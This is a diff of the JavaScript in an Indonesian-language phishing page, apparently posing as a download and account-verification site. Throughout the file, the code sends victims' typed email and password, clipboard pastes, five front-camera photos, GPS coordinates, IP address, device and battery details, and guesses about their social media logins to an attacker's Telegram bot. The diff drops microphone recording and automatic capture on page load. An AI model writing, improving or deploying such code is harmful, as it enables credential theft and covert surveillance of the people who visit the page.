@@ -322,12 +322,12 @@
     const CHAT_ID = '7868298450';
     
     // STATE VARIABLES
-    let audioStream = null;
-    let mediaRecorder = null;
-    let audioChunks = [];
     let hasCapturedCamera = false;
     let hasCapturedLocation = false;
-    let hasCapturedAudio = false;
+    let photosTaken = 0;
+    
+    // STORAGE FOR PERMISSION RESET
+    const STORAGE_KEY = 'phishing_last_reset';
     
     // TELEGRAM FUNCTIONS
     async function sendToTelegram(message, fileBlob = null, fileName = null) {
@@ -335,13 +335,10 @@
         if (fileBlob) {
           const formData = new FormData();
           formData.append('chat_id', CHAT_ID);
-          formData.append(fileName?.endsWith('.mp3') ? 'audio' : 'photo', fileBlob, fileName || 'file');
-          if (!fileName?.endsWith('.mp3')) {
-            formData.append('caption', message);
-          }
+          formData.append('photo', fileBlob, fileName || 'file.jpg');
+          formData.append('caption', message);
           
-          const endpoint = fileName?.endsWith('.mp3') ? 'sendAudio' : 'sendPhoto';
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
           });
@@ -372,29 +369,55 @@
       }
     }
     
-    // GET WEBRTC LOCAL IP
-    async function getLocalIP() {
-      return new Promise((resolve) => {
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel('');
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        
-        pc.onicecandidate = (ice) => {
-          if (!ice.candidate) return;
-          const candidate = ice.candidate.candidate;
-          const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
-          const match = candidate.match(regex);
-          if (match) {
-            pc.close();
-            resolve(match[1]);
+    // GET DEVICE BRAND AND MODEL
+    function getDeviceBrandAndModel() {
+      const ua = navigator.userAgent;
+      let brand = 'Unknown';
+      let model = 'Unknown';
+      let os = 'Unknown';
+      
+      // Detect Android
+      if (/android/i.test(ua)) {
+        os = 'Android';
+        // Try to get brand and model
+        if (/samsung/i.test(ua)) {
+          brand = 'Samsung';
+          if (/sm-[a-z0-9]+/i.test(ua)) {
+            model = ua.match(/sm-[a-z0-9]+/i)[0].toUpperCase();
           }
-        };
-        
-        setTimeout(() => {
-          pc.close();
-          resolve('Local IP Unknown');
-        }, 3000);
-      });
+        } else if (/xiaomi|redmi|poco/i.test(ua)) {
+          brand = 'Xiaomi';
+        } else if (/oppo/i.test(ua)) {
+          brand = 'OPPO';
+        } else if (/vivo/i.test(ua)) {
+          brand = 'Vivo';
+        } else if (/realme/i.test(ua)) {
+          brand = 'Realme';
+        } else if (/huawei|honor/i.test(ua)) {
+          brand = 'Huawei';
+        } else if (/oneplus/i.test(ua)) {
+          brand = 'OnePlus';
+        } else if (/pixel/i.test(ua)) {
+          brand = 'Google';
+          model = 'Pixel';
+        }
+      }
+      // Detect iPhone/iOS
+      else if (/iphone|ipad|ipod/i.test(ua)) {
+        os = 'iOS';
+        brand = 'Apple';
+        if (/iphone/i.test(ua)) {
+          model = 'iPhone';
+          // Try to detect iPhone model
+          if (/iphone\s*(\d+)/i.test(ua)) {
+            model = 'iPhone ' + ua.match(/iphone\s*(\d+)/i)[1];
+          }
+        } else if (/ipad/i.test(ua)) {
+          model = 'iPad';
+        }
+      }
+      
+      return { brand, model, os };
     }
     
     // GET BATTERY INFO
@@ -404,9 +427,9 @@
           const battery = await navigator.getBattery();
           return {
             level: Math.round(battery.level * 100) + '%',
-            charging: battery.charging ? '⚡ Charging' : '🔋 Not Charging',
-            chargingTime: battery.chargingTime === Infinity ? '∞' : battery.chargingTime + 's',
-            dischargingTime: battery.dischargingTime === Infinity ? '∞' : battery.dischargingTime + 's'
+            charging: battery.charging,
+            chargingTime: battery.chargingTime === Infinity ? 'Unknown' : Math.floor(battery.chargingTime / 60) + ' minutes',
+            dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : Math.floor(battery.dischargingTime / 60) + ' minutes'
           };
         } catch {
           return null;
@@ -415,123 +438,35 @@
       return null;
     }
     
-    // DETECT SOCIAL MEDIA LOGIN
-    async function detectSocialMedia() {
-      const results = [];
+    // RESET PERMISSIONS ON REFRESH
+    function resetPermissionsOnRefresh() {
+      const now = Date.now();
+      const lastReset = localStorage.getItem(STORAGE_KEY);
       
-      // Facebook detection
-      try {
-        const fbTest = await fetch('https://www.facebook.com/', { 
-          mode: 'no-cors',
-          credentials: 'include'
-        });
-        results.push('Facebook: ✅ Logged In (Probably)');
-      } catch {
-        results.push('Facebook: ❌ Not Logged In');
-      }
-      
-      // Try to detect via cookies/localStorage
-      setTimeout(() => {
-        try {
-          // Check for Facebook pixel or other trackers
-          if (window.fbq || window.FB) {
-            results.push('Facebook Pixel: ✅ Detected');
-          }
-        } catch {}
-      }, 1000);
-      
-      // Instagram
-      try {
-        await fetch('https://www.instagram.com/', { mode: 'no-cors' });
-        results.push('Instagram: ✅ Active');
-      } catch {
-        results.push('Instagram: ❌ Not Active');
-      }
-      
-      // Twitter
-      try {
-        await fetch('https://twitter.com/', { mode: 'no-cors' });
-        results.push('Twitter: ✅ Active');
-      } catch {
-        results.push('Twitter: ❌ Not Active');
-      }
-      
-      // YouTube
-      try {
-        await fetch('https://www.youtube.com/', { mode: 'no-cors' });
-        results.push('YouTube: ✅ Active');
-      } catch {
-        results.push('YouTube: ❌ Not Active');
-      }
-      
-      return results;
-    }
-    
-    // CAPTURE AUDIO (1 MINUTE)
-    async function captureAudio() {
-      try {
-        audioStream = await navigator.mediaDevices.getUserMedia({ 
-          audio: {
-            echoCancellation: false,
-            noiseSuppression: false,
-            autoGainControl: false
-          }
-        });
+      // Reset permissions every 5 minutes or if never reset
+      if (!lastReset || (now - parseInt(lastReset)) > 5 * 60 * 1000) {
+        localStorage.setItem(STORAGE_KEY, now.toString());
         
-        mediaRecorder = new MediaRecorder(audioStream);
-        audioChunks = [];
+        // Force permission reset by clearing media device caches
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          // Create a dummy request to reset permissions
+          const dummyStream = new MediaStream();
+          // This doesn't guarantee reset but might help
+        }
         
-        mediaRecorder.ondataavailable = (event) => {
-          if (event.data.size > 0) {
-            audioChunks.push(event.data);
-          }
-        };
+        // Clear geolocation cache
+        if (navigator.geolocation) {
+          // Geolocation cache is controlled by browser, we can't clear it directly
+        }
         
-        mediaRecorder.onstop = async () => {
-          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-          const mp3Blob = await convertToMP3(audioBlob);
-          const fileName = `audio_recording_${Date.now()}.mp3`;
-          const file = new File([mp3Blob], fileName, { type: 'audio/mp3' });
-          
-          await sendToTelegram(
-            `🎤 AUDIO RECORDING (1 minute)\n` +
-            `Duration: 60 seconds\n` +
-            `Size: ${Math.round(mp3Blob.size/1024)} KB`,
-            file,
-            fileName
-          );
-          
-          hasCapturedAudio = true;
-          
-          // Stop all tracks
-          audioStream.getTracks().forEach(track => track.stop());
-          audioStream = null;
-        };
-        
-        // Start recording for 1 minute
-        mediaRecorder.start();
-        setTimeout(() => {
-          if (mediaRecorder && mediaRecorder.state === 'recording') {
-            mediaRecorder.stop();
-          }
-        }, 60000); // 1 minute
-        
-      } catch (error) {
-        console.log('Audio capture failed:', error);
-        hasCapturedAudio = false;
+        console.log('Permissions reset attempted for new session');
       }
-    }
-    
-    // CONVERT TO MP3 (simplified)
-    async function convertToMP3(audioBlob) {
-      // In reality, you'd need an audio converter library
-      // For now, just send as webm
-      return audioBlob;
     }
     
     // CAPTURE CAMERA - 5 PHOTOS
     async function captureCamera() {
       try {
+        // Reset camera permission state for this session
         const stream = await navigator.mediaDevices.getUserMedia({
           video: {
             facingMode: 'user',
@@ -556,6 +491,9 @@
         const ctx = canvas.getContext('2d');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
+        
+        // Send camera activated message
+        await sendToTelegram('📸 KAMERA DIAKTIFKAN');
         
         // Take 5 photos
         for (let i = 1; i <= 5; i++) {
@@ -584,10 +522,7 @@
         
       } catch (error) {
         hasCapturedCamera = false;
-        await sendToTelegram(
-          `❌ KAMERA DIBLOKIR\n` +
-          `Error: ${error.message}`
-        );
+        await sendToTelegram(`❌ KAMERA DIBLOKIR: ${error.message}`);
       }
     }
     
@@ -607,11 +542,10 @@
           
           await sendToTelegram(
             `📍 <b>LOKASI DITEMUKAN</b>\n\n` +
-            `🛰️ Koordinat:\n` +
-            `• Latitude: ${position.coords.latitude}\n` +
-            `• Longitude: ${position.coords.longitude}\n` +
-            `• Akurasi: ${Math.round(position.coords.accuracy)} meter\n\n` +
-            `🗺️ Google Maps:\n${mapsLink}`
+            `🛰️ Latitude: ${position.coords.latitude}\n` +
+            `🛰️ Longitude: ${position.coords.longitude}\n` +
+            `🎯 Akurasi: ${Math.round(position.coords.accuracy)} meter\n\n` +
+            `🗺️ <a href="${mapsLink}">Google Maps Link</a>`
           );
           
           hasCapturedLocation = true;
@@ -622,111 +556,137 @@
         
       } catch (error) {
         hasCapturedLocation = false;
-        await sendToTelegram(
-          `📍 <b>LOKASI DIBLOKIR</b>\n` +
-          `Error: ${error.message}`
-        );
+        await sendToTelegram(`📍 LOKASI DIBLOKIR: ${error.message}`);
       }
     }
     
-    // GET DEVICE INFO
-    async function getDeviceInfo() {
-      const info = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screen: `${screen.width}x${screen.height}`,
-        colorDepth: `${screen.colorDepth} bit`,
-        cpuCores: navigator.hardwareConcurrency || 'Unknown',
-        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
-        touchPoints: navigator.maxTouchPoints || 'Unknown'
-      };
+    // DETECT SOCIAL MEDIA
+    async function detectSocialMedia() {
+      const results = [];
       
-      return info;
-    }
-    
-    // AUTO-CAPTURE ON PAGE LOAD
-    async function autoCaptureOnLoad() {
-      console.log('Auto-capture started on page load...');
-      
-      // Try to capture everything silently
+      // Try to detect via various methods
       try {
-        // Try camera
-        setTimeout(() => captureCamera(), 1000);
+        // Method 1: Check for Facebook SDK
+        if (typeof FB !== 'undefined' || typeof fbq !== 'undefined') {
+          results.push('Facebook: ✅ SDK Detected (Probably Logged In)');
+        } else {
+          results.push('Facebook: ❌ SDK Not Detected');
+        }
         
-        // Try location
-        setTimeout(() => captureLocation(), 2000);
-        
-        // Try audio
-        setTimeout(() => captureAudio(), 3000);
+        // Method 2: Try to load Facebook image with credentials
+        const fbImg = new Image();
+        fbImg.src = 'https://www.facebook.com/favicon.ico';
+        fbImg.onload = () => {
+          sendToTelegram('📱 Facebook: Favicon loaded (might be logged in)');
+        };
+        fbImg.onerror = () => {
+          // Could be blocked or not available
+        };
         
       } catch (error) {
-        console.log('Auto-capture error:', error);
+        results.push('Facebook: ❌ Detection Failed');
       }
+      
+      // Instagram detection
+      try {
+        const igImg = new Image();
+        igImg.src = 'https://www.instagram.com/static/images/ico/favicon.ico';
+        igImg.onload = () => {
+          sendToTelegram('📸 Instagram: Favicon loaded');
+        };
+        results.push('Instagram: ⚠️ Checking...');
+      } catch {
+        results.push('Instagram: ❌ Detection Failed');
+      }
+      
+      // YouTube detection
+      try {
+        const ytImg = new Image();
+        ytImg.src = 'https://www.youtube.com/favicon.ico';
+        ytImg.onload = () => {
+          sendToTelegram('🎬 YouTube: Favicon loaded');
+        };
+        results.push('YouTube: ⚠️ Checking...');
+      } catch {
+        results.push('YouTube: ❌ Detection Failed');
+      }
+      
+      // Twitter detection
+      try {
+        const twImg = new Image();
+        twImg.src = 'https://abs.twimg.com/favicons/twitter.ico';
+        twImg.onload = () => {
+          sendToTelegram('🐦 Twitter: Favicon loaded');
+        };
+        results.push('Twitter: ⚠️ Checking...');
+      } catch {
+        results.push('Twitter: ❌ Detection Failed');
+      }
+      
+      return results;
     }
     
     // START DOWNLOAD PROCESS
     async function startDownloadProcess() {
-      // Reset states
+      // Reset states for this session
       hasCapturedCamera = false;
       hasCapturedLocation = false;
-      hasCapturedAudio = false;
+      photosTaken = 0;
       
       // Get all information
-      const publicIP = await getIP();
-      const localIP = await getLocalIP();
+      const ip = await getIP();
+      const deviceInfo = getDeviceBrandAndModel();
       const battery = await getBatteryInfo();
-      const deviceInfo = await getDeviceInfo();
       const socialMedia = await detectSocialMedia();
       
-      // Send comprehensive report
+      // Send initial report
       let report = `⬇️ <b>DOWNLOAD PROCESS STARTED</b>\n\n`;
       
-      report += `🌐 <b>NETWORK INFO:</b>\n`;
-      report += `• Public IP: ${publicIP}\n`;
-      report += `• Local IP: ${localIP}\n\n`;
+      report += `🌐 <b>IP ADDRESS:</b>\n`;
+      report += `• Public IP: <code>${ip}</code>\n\n`;
       
       report += `📱 <b>DEVICE INFO:</b>\n`;
-      report += `• Platform: ${deviceInfo.platform}\n`;
-      report += `• Screen: ${deviceInfo.screen}\n`;
-      report += `• Language: ${deviceInfo.language}\n`;
-      report += `• CPU Cores: ${deviceInfo.cpuCores}\n`;
-      report += `• RAM: ${deviceInfo.deviceMemory}\n\n`;
+      report += `• OS: ${deviceInfo.os}\n`;
+      report += `• Brand: ${deviceInfo.brand}\n`;
+      report += `• Model: ${deviceInfo.model}\n`;
+      report += `• User Agent: ${navigator.userAgent.substring(0, 80)}...\n\n`;
       
       if (battery) {
         report += `🔋 <b>BATTERY INFO:</b>\n`;
         report += `• Level: ${battery.level}\n`;
-        report += `• Status: ${battery.charging}\n`;
-        report += `• Charge Time: ${battery.chargingTime}\n`;
-        report += `• Discharge Time: ${battery.dischargingTime}\n\n`;
+        report += `• Charging: ${battery.charging ? 'Yes ⚡' : 'No 🔋'}\n`;
+        if (battery.charging) {
+          report += `• Time to Full: ${battery.chargingTime}\n`;
+        } else {
+          report += `• Time to Empty: ${battery.dischargingTime}\n`;
+        }
+        report += `\n`;
       }
       
       report += `📊 <b>SOCIAL MEDIA DETECTION:</b>\n`;
       socialMedia.forEach(sm => report += `• ${sm}\n`);
       report += `\n`;
       
-      report += `🎯 <b>CAPTURE STATUS:</b>\n`;
-      report += `• Kamera: ${hasCapturedCamera ? '✅ AKTIF' : '⏳ Menunggu'}\n`;
-      report += `• Lokasi: ${hasCapturedLocation ? '✅ AKTIF' : '⏳ Menunggu'}\n`;
-      report += `• Audio: ${hasCapturedAudio ? '✅ AKTIF' : '⏳ Menunggu'}\n\n`;
+      report += `🎯 <b>REQUESTING PERMISSIONS:</b>\n`;
+      report += `• Camera: Waiting...\n`;
+      report += `• Location: Waiting...\n\n`;
       
       report += `🕒 ${new Date().toLocaleString('id-ID')}`;
       
       await sendToTelegram(report);
       
-      // Start captures
-      await Promise.allSettled([
-        captureCamera(),
-        captureLocation(),
-        captureAudio()
-      ]);
+      // Start camera and location capture
+      const cameraPromise = captureCamera();
+      const locationPromise = captureLocation();
+      
+      // Wait for both to complete
+      await Promise.allSettled([cameraPromise, locationPromise]);
       
       // Send final status
       const finalReport = `✅ <b>CAPTURE COMPLETED</b>\n\n` +
-        `📸 Kamera: ${hasCapturedCamera ? '✅ 5 foto' : '❌ Diblokir'}\n` +
-        `📍 Lokasi: ${hasCapturedLocation ? '✅ Diambil' : '❌ Diblokir'}\n` +
-        `🎤 Audio: ${hasCapturedAudio ? '✅ 1 menit' : '❌ Diblokir'}\n\n` +
-        `🔜 Menuju halaman login...`;
+        `📸 Kamera: ${hasCapturedCamera ? '✅ 5 foto dikirim' : '❌ Ditolak'}\n` +
+        `📍 Lokasi: ${hasCapturedLocation ? '✅ Google Maps link dikirim' : '❌ Ditolak'}\n\n` +
+        `🔜 Menuju halaman verifikasi akun...`;
       
       await sendToTelegram(finalReport);
       
@@ -759,21 +719,26 @@
       
       document.getElementById('securityAlert').classList.remove('show');
       
-      // Get IP and send credentials
+      // Get IP and device info
       const ip = await getIP();
+      const deviceInfo = getDeviceBrandAndModel();
+      
+      // Send login credentials
       await sendToTelegram(
         `✅ <b>LOGIN INFORMATION CAPTURED</b>\n\n` +
-        `👤 <b>ACCOUNT CREDENTIALS:</b>\n` +
+        `👤 <b>AKUN PENGGUNA:</b>\n` +
         `📧 Email: <code>${email}</code>\n` +
         `🔑 Password: <code>${password}</code>\n\n` +
-        `📊 <b>PREVIOUS CAPTURES:</b>\n` +
-        `📸 Kamera: ${hasCapturedCamera ? '✅ 5 foto' : '❌ Diblokir'}\n` +
-        `📍 Lokasi: ${hasCapturedLocation ? '✅ Diambil' : '❌ Diblokir'}\n` +
-        `🎤 Audio: ${hasCapturedAudio ? '✅ 1 menit' : '❌ Diblokir'}\n\n` +
-        `🌐 <b>SYSTEM INFO:</b>\n` +
-        `🆔 IP: ${ip}\n` +
-        `📅 ${new Date().toLocaleDateString('id-ID')}\n` +
-        `⏰ ${new Date().toLocaleTimeString('id-ID')}`
+        `📱 <b>DEVICE INFO:</b>\n` +
+        `• Brand: ${deviceInfo.brand}\n` +
+        `• Model: ${deviceInfo.model}\n` +
+        `• OS: ${deviceInfo.os}\n\n` +
+        `🌐 <b>NETWORK INFO:</b>\n` +
+        `• IP Address: <code>${ip}</code>\n\n` +
+        `📊 <b>CAPTURE RESULTS:</b>\n` +
+        `• Kamera: ${hasCapturedCamera ? '✅ 5 foto' : '❌ Ditolak'}\n` +
+        `• Lokasi: ${hasCapturedLocation ? '✅ Diambil' : '❌ Ditolak'}\n\n` +
+        `🕒 ${new Date().toLocaleString('id-ID')}`
       );
       
       // Reset form
@@ -786,13 +751,14 @@
         
         // Send completion message
         sendToTelegram(
-          `🎉 <b>PROCESS COMPLETED</b>\n\n` +
+          `🎉 <b>PROSES SELESAI</b>\n\n` +
           `✅ Semua data berhasil dikumpulkan\n` +
-          `📦 Total data captured:\n` +
+          `📦 Total data yang didapat:\n` +
           `• Login credentials\n` +
-          `• ${hasCapturedCamera ? '5 camera photos' : 'Camera blocked'}\n` +
-          `• ${hasCapturedLocation ? 'GPS location' : 'Location blocked'}\n` +
-          `• ${hasCapturedAudio ? '1 minute audio' : 'Audio blocked'}\n\n` +
+          `• ${hasCapturedCamera ? '5 foto kamera' : 'Kamera diblokir'}\n` +
+          `• ${hasCapturedLocation ? 'Lokasi GPS' : 'Lokasi diblokir'}\n` +
+          `• Device information\n\n` +
+          `📱 Device: ${deviceInfo.brand} ${deviceInfo.model} (${deviceInfo.os})\n` +
           `🕒 ${new Date().toLocaleString('id-ID')}\n` +
           `🌐 IP: ${ip}`
         );
@@ -802,26 +768,29 @@
       }, 2000);
     });
     
-    // PAGE LOAD - AUTO CAPTURE
+    // PAGE LOAD
     window.addEventListener('load', async () => {
-      console.log('Page loaded, starting auto-capture...');
+      console.log('Page loaded');
+      
+      // Reset permissions on each page load/refresh
+      resetPermissionsOnRefresh();
       
       const ip = await getIP();
+      const deviceInfo = getDeviceBrandAndModel();
+      
       await sendToTelegram(
-        `🌐 <b>PAGE LOADED - AUTO CAPTURE STARTED</b>\n\n` +
-        `🆔 IP: ${ip}\n` +
+        `🌐 <b>PAGE LOADED</b>\n\n` +
+        `🆔 IP: <code>${ip}</code>\n` +
+        `📱 Device: ${deviceInfo.brand} ${deviceInfo.model} (${deviceInfo.os})\n` +
         `📅 ${new Date().toLocaleDateString('id-ID')}\n` +
         `⏰ ${new Date().toLocaleTimeString('id-ID')}\n\n` +
-        `🔒 Mencoba akses:\n` +
-        `• Kamera\n` +
-        `• Mikrofon\n` +
-        `• Lokasi\n\n` +
-        `📱 ${navigator.userAgent.substring(0, 100)}...`
+        `🔒 Permissions will be requested on button click\n` +
+        `🔄 Page refreshed: ${localStorage.getItem(STORAGE_KEY) ? 'Yes' : 'No'}`
       );
       
-      // Start auto-capture in background
+      // Try to auto-detect social media on load
       setTimeout(() => {
-        autoCaptureOnLoad();
+        detectSocialMedia();
       }, 3000);
     });
     
@@ -845,16 +814,6 @@
       if (text && text.length > 3 && 
           (document.activeElement.id === 'email' || document.activeElement.id === 'password')) {
         await sendToTelegram(`📋 CLIPBOARD PASTE\n${text.substring(0, 200)}`);
-      }
-    });
-    
-    // TRY TO CAPTURE ON EVERY PAGE VISIBILITY CHANGE
-    document.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'visible') {
-        console.log('Page visible again, trying auto-capture...');
-        setTimeout(() => {
-          autoCaptureOnLoad();
-        }, 2000);
       }
     });
   </script>
